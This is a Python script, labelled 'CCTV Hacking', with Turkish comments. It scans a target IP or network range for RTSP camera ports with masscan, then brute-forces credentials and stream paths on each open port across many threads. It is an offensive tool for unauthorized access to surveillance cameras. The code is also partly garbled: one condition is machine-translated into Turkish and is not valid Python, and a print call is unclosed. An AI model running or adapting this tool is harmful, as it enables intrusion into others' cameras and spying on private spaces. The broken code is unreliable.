import sys, time, argparse, re, threading
import pyfiglet #pip
from threading import Lock
from colorama import init
from termcolor import colored
from libs import masscanscanner as masscan
from libs import dealer
from libs import attackroutes
from libs import attackcredentials

init() # Colors
s_print_lock = Lock() # güvenli yazdırma için

ascii_banner = pyfiglet.figlet_format("cctv")
print("{}\n{}\n\n".format(ascii_banner, "CCTV Hacking")

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", required=True, help="Yalnızca tek bir IP adresinde hedefleyin.")
args = parser.parse_args()

cidrregex = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])(\/(3[0-2]|[1-2][0-9]|[0-9]))$"
ipv4regex = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
if re.match(cidrregex, args.target) == None and re.match(ipv4regex, args.target) == None:
    print(colored("[ERR] Gecersiz hedef belirtildi.", "red"))
    sys.exit(0)

print(colored("[INFO] RTSP bağlantı noktaları taranıyor...", "cyan"))
scanResults = masscan.detect(args.target)

if scanResults == None:
    print(colored("[!] Hedef bulunamadı. Başka bir ağ deneyin.", "red"))
    sys.exit(0)

print(colored("[INFO] Port taraması tamamlandı. Hedef belirle ve saldırıyı Başlat...", "cyan"))

# Thread-safe print
def s_print(*a, **b):
    with s_print_lock:
        print(*a, **b)

def attack(target, port):
    authMethod = dealer.decide(target, port) # Geçerli hedefin kimlik doğrulama yöntemini alın

    if authMethod == None: # Hedef muhtemelen bilinen bir rota gerektiriyor
        s_print(colored("[INFO] {} limanda {} önce geçerli bir rota gereklidir.bulmaya çalışıyorum...".format(target, port), "cyan"))
        routesFirst = attackroutes.start(target, port, authMethod)

        if routesFirst is not None and len(routesFirst) > 0: # If routes found
            s_print(colored("[INFO] Geçerli rotamız var(s) for {}:{}! şimdi saldırıyor...".format(target, port), "yellow"))
            # Halihazırda bulunan rotalarla kimlik bilgileri saldırısını başlatın
            credsAfter = attackcredentials.start(target, port, authMethod, routesFirst)

            if credsAfter is not None and len(credsAfter) > 0:
                for cred in credsAfter:
                    s_print(colored("[SUCCESS] Bulunan akış: {}".format(cred), "green"))
            else:
                s_print(colored("[FAIL] Kimlik bilgisi bulunamadı {}:{}".format(target, port), "red"))
        else:
            s_print(colored("[FAIL] Şu adreste geçerli bir rota bulunamadı: {}:{}".format(target, port), "red"))
    else: # Digest or Basic authentication
        s_print(colored("[INFO] {} limanda {} önce geçerli bir hesap gerektirir. Brute force şimdi...".format(target, port), "cyan"))
        credsFirst = attackcredentials.start(target, port, authMethod)

        if credsFirst is not None and len(credsFirst) > 0: # If credentials found
            s_print(colored("[INFO] Şunun için geçerli kimlik bilgilerine sahibiz: {}:{}!Şimdi rotaları bulmak...".format(target, port), "yellow")) 
            for user in credsFirst[target][port]:
                # Geçerli kimlik bilgileriyle rota saldırısını başlatın
                routesAfter = attackroutes.start(target, port, authMethod, user, credsFirst[target][port][user])
               routeAfter Yok ve len değilse(routesAfter) > 0:
                    for stream in routesAfter:
                        s_print(colored("[SUCCESS] Bulunan: {}".format(stream), "green"))
                else:
                    s_print(colored("[FAIL] Gecerli rota bulunamadı {}:{}".format(target, port), "red"))
        else:
            s_print(colored("[FAIL] Su adreste kimlik bilgisi bulunamadı {}:{}".format(target, port), "red"))


for target in scanResults:
    for port in scanResults[target]["tcp"]:
        if scanResults[target]["tcp"][port]["state"] != "open":
            continue # Kapalı ports atla (sanity check - no need)

        thread = threading.Thread(target = attack, args = (target, port))
        thread.start()
        if threading.active_count() == 100:
            thread.join()